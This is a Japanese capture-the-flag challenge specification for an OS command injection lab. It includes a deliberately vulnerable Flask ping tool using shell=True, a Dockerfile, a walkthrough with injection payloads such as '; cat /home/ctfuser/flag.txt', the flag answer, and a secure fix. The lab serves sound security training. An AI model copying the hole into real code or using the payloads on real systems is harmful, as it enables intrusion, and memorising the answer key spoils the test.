# Network Monitoring Tool: OS Command Injection

## シナリオ

あなたは、NetWatch Security Divisionの調査員として、疑わしいネットワーク監視ツールの脆弱性診断を命じられた。

**ターゲット**: 内部ネットワーク疎通確認システム  
**目的**: コマンドインジェクションを使用し、サーバー上の機密ファイルにアクセスせよ  
**インテル**: このツールはネットワーク診断機能を持つが、ユーザー入力の検証が不十分であるという報告がある。外部コマンド実行の可能性を調査し、フラグファイル `/home/ctfuser/flag.txt` の内容を入手せよ。

**ミッション**: コマンドインジェクションを実行し、システム内の機密フラグを取得せよ。

---

## 技術的背景: OS Command Injectionとは

### 概要

**OS Command Injection（OSコマンドインジェクション）** は、Webアプリケーションが外部プロセスやシェルコマンドを実行する際、ユーザー入力を適切にサニタイズせずにコマンドに渡すことで発生する脆弱性です。

### 仕組み

#### 1. 通常の処理

```python
# ping コマンドを実行
subprocess.run(f"ping -c 4 {user_input}", shell=True)

# 入力: 8.8.8.8
# 実行されるコマンド: ping -c 4 8.8.8.8
```

#### 2. コマンドインジェクション

```python
# 悪意のある入力
# 入力: 8.8.8.8; cat /home/ctfuser/flag.txt
# 実行されるコマンド: ping -c 4 8.8.8.8; cat /home/ctfuser/flag.txt
```

#### 3. なぜ成功するのか

Unixシェルでは、特殊文字がコマンド制御に使用されます:

| 記号 | 用途 | 例 |
|------|------|-----|
| `;` | コマンド区切り | `cmd1; cmd2` - cmd1実行後、cmd2実行 |
| `&&` | AND（前のコマンド成功時のみ） | `cmd1 && cmd2` |
| `\|` | パイプ（前の出力を次に渡す） | `cmd1 \| cmd2` |
| `$()` | コマンド置換 | `echo $(whoami)` |
| `` ` `` | コマンド置換（古い形式） | ``echo `whoami` `` |
| `\|\|` | OR（前のコマンド失敗時のみ） | `cmd1 \|\| cmd2` |

`shell=True` を使用すると、Pythonはこれらの特殊文字をシェルに解釈させるため、任意のコマンドが実行できます。

---

## 脆弱なコードの仕様

### アプリケーション構成

**技術スタック**:
- **言語**: Python 3.11
- **フレームワーク**: Flask 3.0.0
- **ポート**: 8000
- **機能**: ネットワーク疎通確認（Ping）

### 脆弱なコード実装

**必須実装内容**:

```python
from flask import Flask, request, render_template_string
import subprocess

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        target = request.form['target']
        
        # ❌ 脆弱性: ユーザー入力をそのままコマンドに結合
        command = f"ping -c 4 {target}"
        
        try:
            # ❌ shell=True でコマンドインジェクションが可能（重要！）
            result = subprocess.run(
                command,
                shell=True,  # ← これが重要！
                capture_output=True,
                text=True,
                timeout=10
            )
            
            # ✅ 出力をユーザーに返す（重要！）
            output = result.stdout + result.stderr
            
            return render_template_string('''
                <h1>Network Monitoring Tool</h1>
                <h2>Ping Result:</h2>
                <pre style="background: #000; color: #0f0; padding: 10px;">{{ output }}</pre>
                <a href="/">Back</a>
            ''', output=output)
            
        except subprocess.TimeoutExpired:
            return "Timeout: コマンドの実行に時間がかかりすぎました"
        except Exception as e:
            return f"Error: {str(e)}"
    
    # GET request - ログイン画面
    return render_template_string('''
        <!DOCTYPE html>
        <html lang="ja">
        <head>
            <title>OSコマンドインジェクション - Ping</title>
            <style>
                body {
                    background: #0f0f0f;
                    color: #33ff33;
                    font-family: monospace;
                    padding: 20px;
                }
                .container {
                    max-width: 600px;
                    margin: 0 auto;
                    border: 2px solid #33ff33;
                    padding: 20px;
                    border-radius: 10px;
                }
                input[type="text"] {
                    background: #1a1a1a;
                    color: #33ff33;
                    border: 1px solid #33ff33;
                    padding: 8px;
                    width: 300px;
                    font-family: monospace;
                }
                input[type="submit"] {
                    background: #33ff33;
                    color: #0f0f0f;
                    border: none;
                    padding: 8px 16px;
                    cursor: pointer;
                    font-family: monospace;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>NETWATCH SECURITY</h1>
                <h2>Network Monitoring Tool v2.1</h2>
                <h3>[INTERNAL USE ONLY]</h3>
                <form method="post">
                    <label>Target IP:</label><br>
                    <input type="text" name="target" placeholder="192.168.1.1" value="8.8.8.8"><br><br>
                    <input type="submit" value="Execute Ping">
                </form>
            </div>
        </body>
        </html>
    ''')

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=8000)
```

**重要な実装ポイント**:

1. **`shell=True` は必須**:
   - ✅ 脆弱: `subprocess.run(command, shell=True, ...)`
   - ❌ セキュア: `subprocess.run(['ping', '-c', '4', target], shell=False, ...)`

2. **出力を必ずユーザーに返す**:
   - ✅ 正しい: `return result.stdout + result.stderr`
   - ❌ 間違い: 出力を返さない（フラグが見えない）

3. **入力検証なし**:
   - ✅ 脆弱: そのまま使用
   - ❌ セキュア: IPアドレスの正規表現チェック

### Dockerfile

```dockerfile
FROM python:3.11-slim

RUN useradd -m -u 1000 ctfuser

# Pingコマンドをインストール（重要！）
RUN apt-get update && apt-get install -y --no-install-recommends \
    iputils-ping \
    && rm -rf /var/lib/apt/lists/*

# フラグファイルを作成
RUN echo "SolCTF{command_injection_netwatch_system}" > /home/ctfuser/flag.txt && \
    chmod 644 /home/ctfuser/flag.txt

WORKDIR /home/ctfuser

COPY app.py requirements.txt ./

RUN pip install --no-cache-dir -r requirements.txt

USER ctfuser

EXPOSE 8000

CMD ["python", "app.py"]
```

---

## 攻略手順

### ステップ1: 偵察

1. `http://{{CONTAINER_HOST}}/` にアクセス
2. 「NETWATCH SECURITY」の画面を確認
3. Target IP入力フィールドがある

### ステップ2: 通常の動作確認

入力: `8.8.8.8`  
結果: Pingの実行結果が表示される

```
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=...
```

### ステップ3: 脆弱性の検証

入力: `8.8.8.8; whoami`  
結果: Pingの結果 + `ctfuser` が表示される

→ **コマンドインジェクション成功！**

### ステップ4: ファイルシステム探索

入力: `8.8.8.8; ls -la /home/ctfuser`  
結果: `flag.txt` が存在することを確認

### ステップ5: フラグ取得

**最終ペイロード**:
```
8.8.8.8; cat /home/ctfuser/flag.txt
```

または、より短く:
```
; cat /home/ctfuser/flag.txt
```

**結果**: `SolCTF{command_injection_netwatch_system}`

---

## 難易度設定

```json
{
  "difficulty": 2,
  "difficulty_factors": {
    "tech": 2,
    "read": 2,
    "explore": 2
  }
}
```

**計算**: `Round(2 * 0.4 + 2 * 0.2 + 2 * 0.4) = 2`

---

## Story Hook

```
NetWatch のセキュリティ監査により、内部ネットワーク監視ツールに脆弱性が発見された。このツールは外部コマンド実行機能を持ち、入力値のサニタイズが不十分である。攻撃者がこの脆弱性を悪用する前に、実際に侵入可能かどうかを検証し、証拠となる機密フラグを確保せよ。
```

---

## タグ

- Web
- RCE
- Command Injection
- Beginner
- Linux
- NetWatch

---

## 対策

### セキュアな実装例

```python
# ✅ shell=False + リスト形式
result = subprocess.run(
    ['ping', '-c', '4', target],
    shell=False,
    capture_output=True,
    text=True,
    timeout=10
)

# ✅ 入力検証
import re
if not re.match(r'^[\d.]+$', target):
    return "Error: Invalid IP address format"
```

